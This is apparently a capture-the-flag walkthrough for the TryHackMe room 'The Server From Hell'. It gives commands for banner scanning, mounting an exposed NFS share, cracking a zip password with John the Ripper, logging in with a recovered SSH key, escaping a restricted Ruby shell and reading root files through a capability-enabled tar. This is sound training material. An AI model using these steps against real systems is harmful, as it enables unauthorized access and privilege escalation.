# [The Server From Hell](https://tryhackme.com/room/theserverfromhell)

## Face a server that feels as if it was configured and deployed by Satan himself. Can you escalate to root?

# Hacking the server

## Start at port 1337 and enumerate your way. Good luck.

### flag.txt

1. Start by attempting to connect to port 1337 using curl:

```bash
curl http://<TARGET_IP>:1337
```

**Response:**

```
curl: (1) Received HTTP/0.9 when not allowed
```

The error indicates that the server is using HTTP/0.9 protocol.

```bash
curl --http0.9  http://<TARGET_IP>:1337
```

**Response:**

```
Welcome traveller, to the beginning of your journey
To begin, find the trollface
Legend says he's hiding in the first 100 ports
curl: (56) Recv failure: Connection reset by peer
Try printing the banners from the ports
```

2. Following the hint, we scan ports 1-100 and grab their banners:

```bash
nmap --script banner -p1-100 <TARGET_IP>
```

The banners from ports 6-47 contain hex values that form ASCII art of a trollface. Additionally, hidden within the banner on port 21 is the message "go to port 12345", indicating our next target.

**Results:**

```
20/tcp  open  ftp-data
| banner: 550 12345 0ff0008f00008ffc787f70000000000008f000000087fff8088cf
|_00
21/tcp  open  ftp
| banner: 550 12345 0f7000f800770008777 go to port 12345 80008f7f700880cf
|_00
22/tcp  open  ssh
| banner: 550 12345 0f8008c008fff8000000000000780000007f800087708000800ff
|_00
```

3. Connect to port 12345 to see what information is available:

```bash
curl --http0.9  http://<TARGET_IP>:12345
```

**Response:**

```
NFS shares are cool, especially when they are misconfigured
```

4. Check for available NFS shares on the target:

```bash
showmount -e <TARGET_IP>
```

**Results:**

```
Export list for <TARGET_IP>:
/home/nfs *
```

5. Create a mount point and mount the NFS share:

```bash
mkdir -p nfs_mount
mount -t nfs <TARGET_IP>:/home/nfs nfs_mount
```

6. Copy the backup file and crack its password:

```bash
cp nfs_mount/backup.zip backup.zip
zip2john backup.zip > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash

```

Extract the backup using the discovered password:

```bash
unzip -P 'zxcvbnm' backup.zip -d backup
```

7. Explore the extracted backup directory:

```bash
ls -la backup/home/hades/.ssh
```

**Results:**

```
total 28
drwx------ 2 root root 4096 Sep 15  2020 .
drwxrwxr-x 3 root root 4096 Feb  3 14:46 ..
-rw-r--r-- 1 root root  736 Sep 15  2020 authorized_keys
-rw-r--r-- 1 root root   33 Sep 15  2020 flag.txt
-rw-r--r-- 1 root root   10 Sep 15  2020 hint.txt
-rw------- 1 root root 3369 Sep 15  2020 id_rsa
-rw-r--r-- 1 root root  736 Sep 15  2020 id_rsa.pub
```

8. Read the flag:

```bash
cat backup/home/hades/.ssh/flag.txt
```

[SCREEN01]

---

### user.txt

_The fake ports aren't running real software...only the real one will respond to login attempts._

1. Check the hint file we discovered earlier:

```bash
cat backup/home/hades/.ssh/hint.txt
```

**Result:**

```
2500-4500
```

2. Scan the hinted port range and look for legitimate SSH banners:

```bash
nmap -p2500-4500 --script banner <TARGET_IP> | grep -B 1 -i ssh

```

**Results:**

```
|_banner: HTTP/1.0 661 d\x0D\x0AServer: MacroMaker
3897/tcp open  sdo-ssh
--
4169/tcp open  iadt
| banner: SSH-3334709-OpenSSH_gtyF FreeBSD-openssh-portable-?:dZRhcG,\x0D
--
|_th: 0\x0D\x0AqLocation: https?:///JeJSCQeLn/login.php\x0D\x0AServer:...
4334/tcp open  netconf-ch-ssh

┌──(root㉿kali)-[/home/kali]
└─# nmap -p2500-4500 --script banner <TARGET_IP> | grep -B 1 -i ssh
2581/tcp open  argis-te
|_banner: SSH-57-SSF-6pTMppALH\x0D?
--
2656/tcp open  kana
|_banner: SSH-2.0-dropbear_BRbIDNu\x0D?
--
2663/tcp open  bintec-tapi
|_banner: SSH-768655167-2387 dss F-SECURE SSH\x0D?
--
2668/tcp open  alarm-clock-c
|_banner: SSH-3650-OpenSSHos]+\x0D?
--
2680/tcp open  pxc-sapxom
|_banner: SSH-1.5-X\x0D?
--
2722/tcp open  proactivesrvr
|_banner: SSH-540-IFT SSH server BUILD_VER
--
2853/tcp open  ispipes
|_banner: SSH-26346117-OpenSSH_XJasrHK+CAN-2004-0175\x0D?
--
2904/tcp open  m2ua
|_banner: 220-?s+SSH-47-gfsapzw
--
3001/tcp open  nessus
|_banner: SSH-6-3.5.roV
--
3041/tcp open  di-traceware
|_banner: SSH-2.0-9{8,12}\x0D?
--
3117/tcp open  mctet-jserv
|_banner: SSH-1301559-Nortel\x0D?
--
3165/tcp open  newgenpay
|_banner: SSH-26-4.2.pKygiUab
--
3251/tcp open  sysscanner
|_banner: SSH-90463-RomSShell_wzEdh
--
3318/tcp open  ssrip
|_banner: SSH-9123680-
--
3333/tcp open  dec-notes
|_banner: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
--
3431/tcp open  ndl-als
|_banner: SSH-1201450-OpenSSH_VF_IKiP DragonFly-2r?
--
3454/tcp open  mira
|_banner: SSH-94-IPSSH-28452\x0D?\x0A| p|Cisco/3com IPSSHd
--
3787/tcp open  fintrx
|_banner: SSH-2335-OpenSSH_CFkIVdXPe FreeBSD-66262867\x0D?
--
3802/tcp open  vhd
|_banner: SSH-57032242-OpenSSH__so-hpn\x0D?
--
3848/tcp open  item
|_banner: SSH-829-AKAMAI-I*\x0D?
--
3896/tcp open  sdo-tls
3897/tcp open  sdo-ssh
--
4024/tcp open  tnp1-port
|_banner: SSH-39377911-RedlineNetworksSSH_1 Derived_From_OpenSSH-232\x0D?
--
4169/tcp open  iadt
| banner: SSH-3334709-OpenSSH_gtyF FreeBSD-openssh-portable-?:dZRhcG,\x0D
--
4172/tcp open  pcoip
|_banner: SSH-41342105-90396313 dss F-SECURE SSH\x0D?
--
4221/tcp open  vrml-multi-use
|_banner: SSH-91240485-VShell_79932364 VShell\x0D?
--
4233/tcp open  vrml-multi-use
| banner: SSH-19671-aiaxrAJA FlowSsh: WinSSHD QSdl: free only for persona
--
|_th: 0\x0D\x0AqLocation: https?:///JeJSCQeLn/login.php\x0D\x0AServer:...
4334/tcp open  netconf-ch-ssh
```

Among all the fake SSH banners with random strings, port **3333** shows a legitimate OpenSSH banner: `SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3`. This is the real SSH service.

3. Connect to the real SSH service using the private key we found:

```bash
chmod 600 backup/home/hades/.ssh/id_rsa
ssh -i backup/home/hades/.ssh/id_rsa -p 3333 hades@<TARGET_IP>
```

4. We land in a restricted Ruby shell, escape it by spawning a bash shell:

```bash
exec "/bin/bash"
```

5. Once you have a proper shell, read the user flag:

```bash
cat user.txt
```

[SCREEN02]

---

### root.txt

_getcap_

1. Linux capabilities allow fine-grained privilege control. Some binaries with capabilities can be exploited for privilege escalation. Search for binaries with capabilities:

```bash
getcap / -r 2>>/dev/null
```

**Results:**

```
/usr/bin/mtr-packet = cap_net_raw+ep
/bin/tar = cap_dac_read_search+ep
```

2. According to [GTFOBins](https://gtfobins.github.io/gtfobins/tar/#file-read), we can use `tar` with the `cap_dac_read_search` capability to read any file, including root-owned files.

```bash
/bin/tar cf /dev/stdout /root/root.txt -I 'tar xO'
```

[SCREEN03]
